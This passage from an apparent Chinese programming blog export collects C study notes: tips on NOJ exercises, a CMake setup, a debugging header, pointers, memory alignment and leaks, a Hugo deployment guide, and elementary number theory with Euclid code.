为素数.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 typedef unsigned long long uint64; uint64 pFactNum = 0; // 素因子个数 uint64 prime[20] = {0}, exponent[20] = {0}; // 前19个素数相乘已经非常大了 for (uint64 i = 2; i*i \u0026lt;=k; ++i){ if (k%i == 0){ prime[++pFactNum] = i; while (k%i == 0){ ++exponent[pFactNum]; k /= i; } } } // 无法分解, 说明k为素数 if (k\u0026gt;1) { prime[++pFactNum] = k; ++exponent[pFactNum]; } 匹配时, $n!$ 中含有素因子个数($\\lfloor\\frac{n}{p}\\rfloor+\\lfloor\\frac{n}{p^2}\\rfloor+\u0026hellip;$)应当超过 $k$ 中对应素因子的指数.\n1 2 3 4 5 6 uint64 primeNum = 0, tmp = n; // n!中含有k的第i个素因子的个数 while(tmp) { primeNum += tmp/prime[i]; tmp /= prime[i]; } 二分查找时, 中间值满足条件说明在左区间, 不满足则在右区间; 可以使用开区间或闭区间, 但均须保证不重不漏, 并避免死循环.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 int64 left = 1, right = 1e19, mid, ans; // 闭区间 while (left \u0026lt;= right){ mid = ((right-left)\u0026gt;\u0026gt;1)+left; if (1){ right = mid-1; ans = mid; } else { left = mid+1; } } // 开区间 while (left+1 \u0026lt; right){ mid = ((right-left)\u0026gt;\u0026gt;1)+left; if (1){ right = mid; ans = mid; } else { left = mid; } } 方案数 枚举首项可能会超时, 可以改为枚举项数.\n不妨设存在时, 首项为 $a$, 项数为 $m$, 有 $\\frac{m(2a+m-1)}{2}=n$, 即 $a=\\frac{n-m(m-1)/2}{m}\\geq 1$. 故存在时有 $m|n-m(m-1)/2$ 和 $m\u0026lt;\\sqrt{2n}$.\n哈沙德数 易知 $n=10^k$ 或 $1\\leq n\\leq 9$ 时会导致死循环, 在HarshadNumber中添加\u0026quot;if (s == 1) return 1;\u0026rdquo;, 并修改while.\n1 2 3 4 5 6 int cnt = 0; if (n == 1) cnt = 1; while ((n != 0) \u0026amp;\u0026amp; (n != 1)) { n = HarshadNumber(n); if (n) ++cnt; } 素数 根据题目提示可以得到埃氏筛法, 但埃氏筛法中形如 $p_1\u0026hellip;p_k$ 的数会被素数 $p_1,\u0026hellip;,p_k$ 反复筛取导致时间较长. 可使用数组存储每个数被筛情况, 即线性筛.\n1 2 3 4 5 6 7 8 9 10 11 12 void prime(uint64 n){ bool isPrime[n+1]; memset(isPrime,1,n+1); // 需引入头文件\u0026lt;string.h\u0026gt; uint64 cnt = 0; for (uint64 i = 2; i \u0026lt;= n; ++i){ if (isPrime[i]){ for (uint64 j = 2; j*i \u0026lt;= b; ++j){ isPrime[j*i] = false; // 线性筛 } } } } 基思数 可使用循环数组存储数列, 存储时低位在左端, 高位在右端, 从右到左循环遍历.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 int arr[8] = {0}; // 最大位数为8 int len = 0, tmp = n; while (tmp){ arr[len++] = tmp%10; // 低位在左端, 高位在右端 tmp /= 10; } int i = len - 1; while (arr[i] \u0026lt; n){ int sum = 0; for (int j = 0; j \u0026lt; len; ++j) { sum += arr[(i-j+len)%len]; // 从右到左遍历 } arr[i] = sum; i = (i-1+len)%len; // 左移 } 二进制表示 递归函数实现, 从高位依次取二进制位, 超过范围时进入递归, 设置标识判断何时输出加号.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 bool flag = false; for (int i = 15; i \u0026gt;= 0 ; --i) { if ((a\u0026gt;\u0026gt;i)\u0026amp;1) { if (flag) printf(\u0026#34;+\u0026#34;); if (i \u0026gt;= 2){ printf(\u0026#34;2(\u0026#34;); binary(i); printf(\u0026#34;)\u0026#34;); } if (i == 1) printf(\u0026#34;2\u0026#34;); if (i == 0) printf(\u0026#34;2(0)\u0026#34;); flag = true; } } 光线追踪 反射经过的三边总长相等(否则无法回到入射点), 即可以通过平移得到等边三角形; 每轮反射时相当于累加更相减损的结果, 或说Euclid算法减去余数部分; 而最终余数为 ${\\rm gcd}(n,x)$, 故总长度为 $3(n-{\\rm gcd(n,x)})$.\n使用\u0026quot;unsigned int\u0026quot;.\n冰雹数列 最后一位不能有空格.\n佩尔数 略.\n可变参数累加 1 2 3 4 5 6 7 8 9 10 11 #include \u0026lt;stdarg.h\u0026gt; void func([typename] start, ...){ va_list vaList; \\\\ 初始化参数列表 va_start(vaList,start); \\\\ 开始参数列表 [typename] curr = start; while(curr != num){ \\\\ 读到num时停止循环 curr = va_arg(vaList,[typename]); \\\\ 获取参数列表中下一个参数 } va_end(vaList) \\\\ 结束参数列表 } 运动会 以队长为原点构建平面直角坐标系, 观察可得所求即互素对 $(x,y)$, $1\\leq x,y\\leq N-1$ 个数, 即 $2\\sum_{i=1}^{n-1}\\varphi(i)+1$. $\\varphi(n)$ 为Euler函数, 含义为所有小于 $n$ 且与 $n$ 互素的数的个数.\nEuler函数满足如下性质:\n若素数 $p|n$, 则 $\\varphi(pn)=p\\varphi(n)$; 若素数 $p\\nmid n$, 则 $\\varphi(pn)=(p-1)\\varphi(n)$; 若 ${\\rm gcd}(m,n)=1$, 则 $\\varphi(m,n)=\\varphi(m)\\varphi(n)$; 若 $n=\\prod_{i=1}^k p_i^{\\alpha_i}$, 则 $\\varphi(n)=n\\prod_{i=1}^k(1-\\frac{1}{p_i})$. 在 $n$ 较小时, 可使用线性筛节省时间; 在 $n$ 较大时, 可使用因式分解节省空间.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 void phiEuler(int n){ int phi[n+1],prime[n+1]; bool isSieved[n+1]; int sum = 0, cnt = 1, comp; prime[0] = 1; phi[1] = 1; for (int i = 2; i \u0026lt; n; ++i){ if (!isSieved[i]){ prime[cnt++] = i; phi[i] = i-1; // Euler函数性质 } for (int j = 1; i*prime[j] \u0026lt;= n; ++j){ comp = i*prime[j]; isSieved[comp] = true; // 线性筛 if (i%prime[j] == 0){ phi[comp] = prime[j]*phi[i]; // Euler函数性质 break; } else{ phi[comp] = (prime[j]-1)*phi[i]; // Euler函数性质 } } } } 可变参数平均 1 2 3 4 5 6 7 8 void func(int num, ...){ va_list vaList; \\\\ 初始化参数列表 va_start(vaList,start); \\\\ 开始参数列表 for (int i = 0; i \u0026lt; num; ++i){ \\\\ 读取num个后停止循环 [typename] curr = va_arg(vaList,[typename]); \\\\ 获取参数列表中下一个参数 } va_end(vaList) \\\\ 结束参数列表 } ","date":"2023-09-19T00:00:00Z","permalink":"https://example.com/p/nojc%E6%98%93%E9%94%99%E6%80%BB%E7%BB%93/","title":"NOJ(C)易错总结"},{"content":"标准默认C11, 编译器默认GCC8.1.0及MSVC1937. 内容不分先后顺序, 请按需查阅.\nCMAKE 使用CLion或VS时, 可以考虑如下CMAKE配置; 会自动获取项目名与文件名, 每次修改项目名文件名或新建文件时, 只需重新加载CMAKE.\n1 2 3 4 5 6 7 8 9 10 11 12 13 cmake_minimum_required(VERSION 3.26) get_filename_component(ProjectId ${CMAKE_CURRENT_SOURCE_DIR} NAME) string(REPLACE \u0026#34; \u0026#34; \u0026#34;_\u0026#34; ProjectId ${ProjectId}) project(${ProjectId} C) set(CMAKE_C_STANDARD 11) file(GLOB files \u0026#34;${CMAKE_CURRENT_SOURCE_DIR}/*.c\u0026#34;) foreach(file ${files}) get_filename_component(name ${file} NAME) add_executable(${name} ${file}) endforeach() 添加头文件:\n1 include_directories(\u0026#34;头文件相对路径\u0026#34;) 此外, 还可以修改C标准版本:\n1 set(CMAKE_C_STANDARD 99) 一个方便调试的头文件 该头文件中定义用变长参数定义了一系列输出函数, 可以直接采用\u0026quot;PRINT_TYPE(variable);\u0026ldquo;的形式来打印对应类型的变量并换行. 传入数组时, 传入的是数组的首位指针, 还需在外部获取数组长度一并传入.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 #ifndef BASICC_IO_UTILS_IO_UTILS_H_ #define BASICC_IO_UTILS_IO_UTILS_H_ #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;limits.h\u0026gt; void PrintBinary(unsigned int value); //#define PRINT_METADATA #ifdef PRINT_METADATA # define PRINTLNF(format, ...) printf(\u0026#34;(\u0026#34;__FILE__\u0026#34;:%d) %s: \u0026#34;format\u0026#34;\\n\u0026#34;, __LINE__, __FUNCTION__ , ##__VA_ARGS__) #else # define PRINTLNF(format, ...) printf(format\u0026#34;\\n\u0026#34;, ##__VA_ARGS__) #endif #define PRINT_CHAR(char_value) PRINTLNF(#char_value\u0026#34;: %c\u0026#34;, char_value) #define PRINT_WCHAR(char_value) PRINTLNF(#char_value\u0026#34;: %lc\u0026#34;, char_value) #define PRINT_INT(int_value) PRINTLNF(#int_value\u0026#34;: %d\u0026#34;, int_value) #define PRINT_LONG(long_value) PRINTLNF(#long_value\u0026#34;: %ld\u0026#34;, long_value) #define PRINT_LLONG(long_value) PRINTLNF(#long_value\u0026#34;: %lld\u0026#34;, long_value) #define PRINT_BINARY(int_value) PrintBinary((unsigned int) int_value); #define PRINT_HEX(int_value) PRINTLNF(#int_value\u0026#34;: %#x\u0026#34;, int_value) #define PRINT_BOOL(bool_value) PRINTLNF(#bool_value\u0026#34;: %s\u0026#34;, bool_value ? \u0026#34;true\u0026#34; : \u0026#34;false\u0026#34;) #define PRINT_DOUBLE(double_value) PRINTLNF(#double_value\u0026#34;: %g\u0026#34;, double_value) #define PRINT_STRING(string_value) PRINTLNF(#string_value\u0026#34;: %s\u0026#34;, string_value) #define PRINT_ARRAY(format, array, length) \\ { int array_index; \\ for (array_index = 0; array_index \u0026lt; length; ++array_index) { \\ printf(format, array[array_index]); \\ };\\ printf(\u0026#34;\\n\u0026#34;); } #define PRINT_INT_ARRAY_LN(array, length) \\ { int i; \\ for (i = 0; i \u0026lt; length; ++i) { \\ PRINTLNF(#array\u0026#34;[%d]: %d\u0026#34;, i, array[i]); \\ }} #define PRINT_INT_ARRAY(array, length) PRINT_ARRAY(\u0026#34;%d, \u0026#34;, array, length) #define PRINT_CHAR_ARRAY(array, length) PRINT_ARRAY(\u0026#34;%c, \u0026#34;, array, length) #define PRINT_DOUBLE_ARRAY(array, length) PRINT_ARRAY(\u0026#34;%g, \u0026#34;, array, length) #endif //BASICC_IO_UTILS_IO_UTILS_H_ 来自: https://www.bennyhuo.com/\n赋值语句 在赋值语句中, 左值(\u0026quot;=\u0026ldquo;左边)必须是一个变量或说内存, 不能为数值; 右值(\u0026quot;=\u0026ldquo;右边)一定为数值.\n1 2 3 4 5 int *p = \u0026amp;a; *p = 2; // 合法 *(p+1) = 3; // 合法 \u0026amp;a = p; // 非法, \u0026amp;a为变量a的地址, 是数值 *p+1 = 4; // 非法, *p解引用, *p+1为p指向的内存中的数据+1, 是数值 1 2 3 4 5 int array[] = {0,1,2,3}; int *p = array; *p = 10; // 合法 *p++ = 20; // 合法 *++p = 30; // 合法 不同数据类型的运算 整型提升: 表达式中存在(unsigned) int, 则 (unsigned) char, (unsigned) short int, enum 均转换为int, 不足时转换为 unsigned int.\n1 2 3 4 5 6 7 8 9 10 #include\u0026lt;stdio.h\u0026gt; int main(){ char ch = \u0026#39;a\u0026#39;; short st = 4; int i = 0; printf(\u0026#34;%llu %llu\\n\u0026#34;,sizeof(ch+st),sizeof(i)); return 0; } 隐式转换: 算术表达式: 低类型转换为高类型, int -\u0026gt; unsigned int -\u0026gt; long -\u0026gt; unsigned long -\u0026gt; long long -\u0026gt; unsigned long long -\u0026gt; float -\u0026gt; double -\u0026gt; long double; 赋值表达式: 右值转换为左值; 函数传参: 实参转换为形参; 函数返回值: 表达式转换为返回值. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #include\u0026lt;stdio.h\u0026gt; int main(){ int i = 0; unsigned int ui = 0; long l = 1; long long ll = 2; float f = 0.1f; double d = 0.2f; printf(\u0026#34;%llu %llu\\n\u0026#34;,sizeof(i+l),sizeof(l)); printf(\u0026#34;%llu %llu %llu \\n\u0026#34;,sizeof(l+ll),sizeof(ui+ll),sizeof(ll)); printf(\u0026#34;%llu %llu\\n\u0026#34;,sizeof(ll*f),sizeof(f)); printf(\u0026#34;%llu %llu\\n\u0026#34;,sizeof(f+d),sizeof(d)); short s = d*ll; printf(\u0026#34;%llu\\n\u0026#34;,sizeof(s)); return 0; } 1 2 3 4 5 6 7 8 9 10 11 12 13 #include\u0026lt;stdio.h\u0026gt; double func(int a){ printf(\u0026#34;%llu\\n\u0026#34;,sizeof(a)); return a; } int main(){ double a = 2.9f; printf(\u0026#34;%llu\\n\u0026#34;,sizeof(func(a))); printf(\u0026#34;%f\u0026#34;, func(a)); return 0; } 强制类型转换: (类型名) 表达式\n1 2 3 4 5 6 7 8 9 10 #include \u0026lt;stdio.h\u0026gt; int main(){ int a = 17, b = 5; double c = a/b; double d = (double)a/b; printf(\u0026#34;%f %f\u0026#34;,c,d); return 0; } 应用: 模平方时防止越界\n1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;stdio.h\u0026gt; int main(){ int a = 104560; int m = 1307; int b = (a*a)%m; int c = (1LL*a*a)%m; int d = ((long long)a*a)%m; printf(\u0026#34;%d %d %d\u0026#34;,b,c,d); return 0; } 内存对齐 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #include \u0026lt;stdio.h\u0026gt; int main(){ typedef struct { char sch1; char sch2; int si; short ss; double sd; } Align; char ch; int i; short s; double d; printf(\u0026#34;%llu\\n\u0026#34;, sizeof(Align)); printf(\u0026#34;%llu\\n\u0026#34;, sizeof(ch)+ sizeof(ch)+ sizeof(i)+ sizeof(s)+ sizeof(d)); return 0; } 发现结构体内部变量占用空间加起来仅为16个字节, 但结构体占用24个字节, 这就涉及到结构体的内存对齐.\nchar占用1字节, 对齐到1的倍数; int占用4字节, 对齐到4的倍数; double占用8字节, 对齐到8的倍数. 尽管内存以字节为基本单位, 但CPU会以4字节, 8字节, 甚至16字节进行访问; 在没有对齐机制时, 访问到正确的变量位置需要额外操作. 内存对齐系数由编译器决定, 结构体占用内存为对齐系数倍数. GCC和MSVC中默认对齐系数均为4, 可以通过预编译\u0026rdquo;#pragma pack(n)\u0026ldquo;来改变.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include \u0026lt;stdio.h\u0026gt; #pragma pack(2) int main(){ typedef struct { char sch1; char sch2; int si; short ss; double sd; } Align; printf(\u0026#34;%llu\\n\u0026#34;, sizeof(Align)); return 0; } 但通常不建议改变对齐系数, 为了使结构体占用更小内存, 应当将占用较小的变量统一排在前面, 如将上述结构体修改为:\n1 2 3 4 5 6 7 8 9 10 11 int main(){ typedef struct { char sch1; char sch2; short ss; int si; double sd; } Align; printf(\u0026#34;%llu\\n\u0026#34;, sizeof(Align)); return 0; } 动态数组 有时在声明数组时无法确定数组长度, 需要传入参数.\n1 2 3 4 5 6 7 #include \u0026lt;stdio.h\u0026gt; int main(){ int n = 3; int a[n]; return 0; } GCC可以编译通过; 但MSVC不支持变长数组, 会报错. 可以考虑用内存分配函数实现, 调用方式同数组.\n1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;malloc.h\u0026gt; int main(){ int n = 3; int *a = (int*)malloc(n*sizeof(int)); a[0] = 1; printf(\u0026#34;%d\u0026#34;,a[0]); free(a); a = NULL; return 0; } 深入理解指针 声明变量时, 如\u0026quot;int a;\u0026rdquo;, 在运行时会为变量a开辟一块内存空间, 但值不能确定. 用scanf写入时, 用\u0026rdquo;\u0026amp;a\u0026quot;表示写入到变量a所在的地址. 地址的数据类型即为指针类型, 即指针类型的变量存放的数据为内存地址.\n数据类型包含两个信息: 内存占用大小; 读写时遵循的规则. 定义一个指针类型时, 还需要给出指向的数据类型. 这是因为指针仅指向一个内存单元, 也就是CPU读写的起始位置(小端序下的数据低位); 只有给出指向的数据类型, CPU才能知道读写的终止位置和读写遵循的规则.\n1 2 3 4 5 6 7 8 9 #include \u0026lt;stdio.h\u0026gt; int main(){ long long a = 0x0A0B0C0D; long long* p1 = \u0026amp;a; int* p2 = \u0026amp;a; // 在本行打断点调试, 在CLion或VS的Memory View中输入\u0026amp;a查看内存位置, 并对比Threads \u0026amp; Variables中p1,p2的值 return 0; } 此外, 指针类型的占用空间取决于CPU寻址方式, 与指向的数据类型无关.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include \u0026lt;stdio.h\u0026gt; int main(){ char a; short b; int c; double d; char *pa = \u0026amp;a; short *pb = \u0026amp;b; int *pc = \u0026amp;c; double *pd = \u0026amp;d; printf(\u0026#34;%llu %llu %llu %llu\u0026#34;,sizeof(pa),sizeof(pb),sizeof(pc),sizeof(pd)); return 0; } 无歧义地, 指针类型和指针类型变量均简称为指针.\n1 2 3 4 // 指针存放的是地址, 以下显然是合法的. int a; int *p = \u0026amp;a; scanf(\u0026#34;%d\u0026#34;,p); 显然\u0026quot;int **p\u0026quot;意为指向\u0026quot;int *\u0026ldquo;类型的指针, \u0026ldquo;int ***p\u0026quot;意为指向\u0026quot;int **\u0026ldquo;类型的指针. \u0026ldquo;*p\u0026quot;含义为解引用, 即读写指针p指向的内存.\n在使用指针时, 应当避免出现野指针, 即指向非法内存的指针.\n1 2 3 // 使用未初始化的指针 int *p; printf(\u0026#34;%d\u0026#34;,*p); 1 2 3 4 // 释放指针后未置空 int *p = (int*)malloc(sizeof(int)); free(p); printf(\u0026#34;%d\u0026#34;,*p); 1 2 3 4 5 6 7 8 9 // 指向对象已消亡(超出变量作用域) int *Address(void){ int a = 10; return \u0026amp;a; } void getAddress(void){ int *p = Address(); printf(\u0026#34;%d\u0026#34;,*p); } 1 2 3 4 5 // 指针赋值为无法读取的内存 int *p = (int *) 0x100000; printf(\u0026#34;%d\u0026#34;,*p); // Windows进程内存空间地址从0x400000开始 // 但考虑到平台不同时进程起始位置不同, 通常不建议赋值为具体地址 指针也可以进行加减运算, 含义为指向前后的内存, 移动单位取决于指向的数据类型.\n1 2 3 4 5 6 7 8 #include \u0026lt;stdio.h\u0026gt; int main(){ double a = 0.0f; double *p = \u0026amp;a; printf(\u0026#34;%u %u %u %llu\u0026#34;,p-1,p,p+1,sizeof(a)); return 0; } 数组是连续的内存, 由此想到可以通过数组指针来调用数组, 同时数组变量名本质上也是指针.\n1 2 3 4 5 6 7 8 9 #include \u0026lt;stdio.h\u0026gt; int main(){ int array[] = {0,1,2,3}; int *p = array; printf(\u0026#34;%d %d %d %d %d\u0026#34;,array[2],p[2],*(p+2),*(array+2),2[array]); return 0; } // 考虑到可读性, 仅推荐array[2]和p[2]两种调用方式. 指针自然也可以作为函数参数. 调用函数赋值时, 如\u0026quot;int a = func(b);\u0026rdquo;, CPU将函数返回值复制到寄存器中, 再将寄存器中的数据复制到要改变的变量, 这一过程也就体现为变量的作用域. C可以返回结构体, 同时无法直接返回数组, 不使用指针时可以将数组包含在结构体中; 而若直接返回结构体, 结构体由于本身占用较大, 复制两次导致性能开销过大. 此时, 可以在函数外声明结构体或数组, 并将指向结构体的指针或数组传入.\n函数也存在地址, 自然也可以有指向函数的指针. 但声明函数指针时, 运算优先级问题往往让人感到困惑: 如参数列表\u0026rdquo;()\u0026ldquo;的优先级高于\u0026rdquo;*\u0026rdquo;. 在分析函数声明时, 可以借助网站: https://cdecl.org/.\n字符串长度 C中字符串应以\u0026quot;NULL\u0026rdquo;(或\u0026rdquo;\\0\u0026quot;或0)结尾, 字符串的长度应当包含结尾的\u0026quot;NULL\u0026quot;, 但使用\u0026lt;string.h\u0026gt;库中的\u0026quot;strlen()\u0026ldquo;函数时, 返回的是字符串的有效长度: 如在第n-1位遇到NULL, 则返回n.\n1 2 3 4 5 6 7 8 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main(){ char a[20] = \u0026#34;string\u0026#34;; printf(\u0026#34;%llu\u0026#34;,strlen(a)); return 0; } 字符串和数组一样有多种声明方式. 以长度声明字符串时, 需注意留一位给末尾的\u0026quot;NULL\u0026rdquo;. 动态长度字符串同数组, 同时使用\u0026quot;memset()\u0026ldquo;函数初始化. 若用\u0026quot;strlen()\u0026ldquo;得到其他字符串输出时, 想要得到相同有效长度的字符串需要声明长度为\u0026quot;strlen(string)+1\u0026rdquo;. 尽管不以\u0026quot;NULL\u0026quot;结尾有时不会得到错误的输出, 但应当避免不规范的使用. 仅以字符串值声明字符串时, 编译器会默认在结尾添加\u0026quot;NULL\u0026rdquo;, 无论字符串值末尾是否有\u0026quot;\\0\u0026quot;.\n1 2 3 4 5 int main(){ char str[] = \u0026#34;C is the best language!\\0\u0026#34;; // 此处打断点调试, 发现字符串长度为25, 但有效字符只有23个, 最后两个均为\u0026#34;NULL\u0026#34;. return 0; } 逻辑短路 对于逻辑运算符与\u0026quot;\u0026amp;\u0026amp;\u0026ldquo;和或\u0026rdquo;||\u0026ldquo;存在短路规则, \u0026ldquo;\u0026amp;\u0026amp;\u0026ldquo;前若已为假则忽略后续直接返回\u0026quot;fasle\u0026rdquo;, 同理\u0026rdquo;||\u0026ldquo;前若已为真则忽略后续直接返回\u0026quot;true\u0026rdquo;.\n1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;stdio.h\u0026gt; int main(){ int a = 0, b = 1, c = 10, f, t; f = a \u0026amp;\u0026amp; (b - ++c); t = b || (a - c++); printf(\u0026#34;%d\\n\u0026#34;,c); f = b \u0026amp;\u0026amp; (a - ++c); t = a || (b - c++); printf(\u0026#34;%d\\n\u0026#34;,c); return 0; } 运算优先级上, \u0026ldquo;()\u0026ldquo;和\u0026rdquo;++\u0026ldquo;都高于\u0026rdquo;\u0026amp;\u0026amp;\u0026ldquo;和\u0026rdquo;||\u0026rdquo;, 但第一次f和t赋值中有副作用的\u0026rdquo;++\u0026ldquo;一次也没有被执行, 第二次中都被执行了.\n内存溢出和内存泄漏 内存溢出指申请空间没有足够的空间可以使用, 如声明\u0026quot;int\u0026quot;类型变量, 但赋值了超出\u0026quot;int\u0026quot;类型的数.\n内存泄漏指申请使用内存后, 无法释放已经申请的内存空间; 内存泄漏累积就会造成内存溢出. (在某些优化较差的游戏中, 如刺客信条: 大革命, 游玩时会突然卡死, 打开任务管理器发现内存占用率100%, 可能就是遇到了内存泄漏问题.) 对于个人用户, 内存泄漏也许不严重, 结束程序进程时会释放所有已分配的内存; 但对于服务器, 某些程序需要一直保持运行, 内存泄漏会不断累积并造成严重后果.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // 比较低级的错误: 分配的内存使用完后没有释放 // 指针重新赋值时, 原指向位置丢失 int *p = (int *)malloc(sizeof(int)); int *np = (int *)malloc(sizeof(int)); p = np; // 内存释放时, 造成位置孤立 head -\u0026gt; next = node; free(head); // 分配了没有指针指向的内存 int *memory(){ return (int *)malloc(sizeof(int)); } void lost(){ memory(); } 防止内存泄漏的核心思想是: 进行任何内存有关的操作时, 始终确保每个已分配的内存都有指针指向.\n待更新内容: 聚合体与字节序, 副作用, 按位运算妙用, 宏函数, 变长参数, 线程\n","date":"2023-09-16T00:00:00Z","permalink":"https://example.com/p/c%E6%9D%82%E8%B0%88/","title":"C杂谈"},{"content":"PREPARATION git download hugo download Check git \u0026amp; hugo added in the environment variables (Windows).\nThe following steps are in Bash.\n1 2 git version hugo version ON PREMISES 1 2 3 4 5 6 hugo new site blog cd blog git clone https://themeName themes/themeName cp themes/themeName/exampleSite/* ./ -r rm hugo.toml hugo server FIRST COMMIT Github Create Repositoriy: username.github.io\n1 2 3 4 5 6 7 hugo cd public git init git remote add origin https://github.com/username/username.github.io.git git add . git commit -m \u0026#34;first commit\u0026#34; git push -u origin master LATER COMMIT 1 2 3 4 5 6 hugo cd public git add . git status git commit -m \u0026#34;add blog post\u0026#34; git push KATEX CONFUSION display obsidian hugo newline \\\\ \\\\\\ % \\% \\\\% suffix { }_ { }\\_ * * \\* ","date":"2023-09-14T00:00:00Z","permalink":"https://example.com/p/hugo%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/","title":"hugo快速入门"},{"content":"文中所有C代码均编译通过并得到正确结果! (C11 - GCC8.1.0)\n整除 性质: $c|a$, $c|b \\Longrightarrow$ $c|ax+by$, $\\forall x,y\\in\\mathbb{Z}$. 最大公因数: ${\\rm gcd}(a,b)=\\inf_{\\geq 0}\\{sa+tb|s,t\\in\\mathbb{Z}\\}$.\n辗转相除求${\\rm gcd}$: $$\\begin{align} \u0026amp;a=q_1b+r_1\\\\ \u0026amp;b=q_2r_1+r_2\\\\ \u0026amp;\u0026hellip;\\\\ \u0026amp;r_{n-2}=q_nr_{n-1}+r_n \\end{align}$$ 当 $r_n=0$ 时, 有 $r_{n-1}={\\rm gcd}(a,b)$.\n对序列中被除数与除数从$1$开始编号, 进而有递归: $$\\begin{align} \u0026amp;a_i=(a_i/b_i)b_i+(a_i\\%b_i)\\\\ \u0026amp;a_i=b_{i-1}\\\\ \u0026amp;b_i=a_{i-1}\\%b_{i-1} \\end{align}$$ 并约定 ${\\rm gcd}(a,0)=a$.\n1 2 3 int Euclid(int a, int b){ return b==0? a : Euclid(b,a%b); } Bezout定理: 给定 $a,b\\in\\mathbb{Z}$, Diophantine方程 $ax+by=m$ 有解 $\\Longleftrightarrow$ ${\\rm gcd}(a,b)|m$.\n可仅考查 $m={\\rm gcd}(a,b)$, 不然, 结果只需乘相应倍数. 在递归中, 显然有 ${\\rm gcd}(a,b)={\\rm gcd}(a_i,b_i)$, 即 $\\exists x_i,y_i\\in\\mathbb{Z}$ s.t. $a_ix_i+b_iy_i=m$. $$\\begin{align} m\u0026amp;=a_ix_i+b_iy_i\\\\ \u0026amp;=b_{i-1}x_i+(a_{i-1}\\%b_{i-1})y_i\\\\ \u0026amp;=b_{i-1}x_i+[a_{i-1}-(a_{i-1}/b_{i-1})b_{i-1}]y_i\\\\ \u0026amp;=y_ia_{i-1}+[x_i-(a_{i-1}/b_{i-1})y_i]b_{i-1}\\\\ \u0026amp;=x_{i-1}a_{i-1}+y_{i-1}b_{i-1} \\end{align}$$\n1 2 3 4 5 6 7 8 9 10 11 12 13 int extEuclid(int a, int b, int* x, int* y){ if (b==0){ *x = 1; *y = 0; return a; } else { int tempX,tempY; int gcd = extEuclid(b,a%b,\u0026amp;tempX,\u0026amp;tempY); *y = tempX-(a/b)*tempY; *x = tempY; return gcd; } } 而使用CPP元组写法上更优雅些:\n1 2 3 4 5 6 7 8 9 tuple\u0026lt;int,int,int\u0026gt;extEuclidCpp(int a, int b){ if (b==0){ return make_tuple(a,1,0); } else { int x,y,gcd; tie(x,y,gcd) = extEuclidCpp(b,a%b); return make_tuple(gcd,y,x-(a/b)*y); } } 定理: 素数i $p$ 及 $a,b\\in\\mathbb{Z}$, 若 $p|ab$ 则 $p|a$ 或 $p|b$.\n设 $p\\nmid a$ 且 $p\\nmid b$, 则 $\\exists x,y$ s.t. $xp+ya=1$, 故 $x(ab)+(by)p=b$, 有 $p|b$, 矛盾.\n唯一分解: $\\forall n\\in\\mathbb{Z}$, $n=\\prod p_i^{k_i}$, $p_i$ 为不同素数, $k_i\\in\\mathbb{Z}_+$, 形式唯一.\n同余 性质: $\\forall m\\in\\mathbb{Z}_+$, $a\\equiv b({\\rm mod}\\ m) \\Longleftrightarrow m|a-b$.\n$a\\equiv b({\\rm mod}\\ m)$, $c\\equiv d({\\rm mod}\\ m) \\Longrightarrow a+c\\equiv b+d({\\rm mod}\\ m)$, $ac\\equiv bd({\\rm mod}\\ m)$, $a^n\\equiv b^n({\\rm mod}\\ m)$. $ak\\equiv bk({\\rm mod}\\ m) \\Longrightarrow a\\equiv b({\\rm mod}\\ \\frac{m}{{\\rm gcd}(m,k)})$. 模 $m$ 剩余类: $\\mathbb{Z}/m\\mathbb{Z}$. 最小非负完全剩余系: $\\mathbb{Z}_m=\\{0,1\u0026hellip;,m-1\\}$, 显然 $\\forall x\\neq y\\in\\mathbb{Z}_m$ s.t. $x\\not\\equiv y({\\rm mod}\\ m)$. 既约剩余系: $\\mathbb{Z}_m^*=\\{a\\in\\mathbb{Z}_m|{\\rm gcd}(a,m)=1\\}$.\nEuler $\\varphi$ 函数: $$m=\\prod_{i=1}^r p_i^{k_i}, |\\mathbb{Z}_m^*|=\\varphi(m)=\\prod_{i=1}^r p_i^{k_i-1}(p_i-1)=m\\prod_{p|m}(1-\\frac{1}{p})$$\n当 $m=p$ 为素数时, 有 $\\varphi(p)=p-1$; $\\mathbb{Z}_p^*=\\{1,2,\u0026hellip;,p-1\\}$ 为循环群, 生成元个数为$\\varphi(p-1)$.\n考察函数性质:\n若素数 $p|n$, 则 $\\varphi(pn)=p\\varphi(n)$; 若素数 $p\\nmid n$, 则 $\\varphi(pn)=(p-1)\\varphi(n)$; 若 ${\\rm gcd}(m,n)=1$, 则 $\\varphi(m,n)=\\varphi(m)\\varphi(n)$. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // O(n), 每个数均只遍历一次 void phiEulerLinerSieve(int n){ int phi[n+1], prime[n+1]; bool isSieved[n+1]; int count = 1; prime[0] = 1; phi[1] = 1; for (int i = 2; i \u0026lt; n; ++i){ if (!isSieved[i]){ prime[count++] = i; phi[i] = i-1; } for (int j = 1; i*prime[j] \u0026lt;= n; ++j){ int composite = i*prime[j]; isSieved[composite] = 1; if (i%prime[j] == 0){ phi[composite] = primep[j]*phi[i]; break; } else { phi[composite] = (prime[j]-1)*phi[i]; } } } } 定理: 若 ${\\rm \\gcd}(a,m)=1$, $x$ 遍历 $\\mathbb{Z}_m^*$, 则 $ax$ 也遍历$\\mathbb{Z}_m^*$.\n考虑 ${\\rm 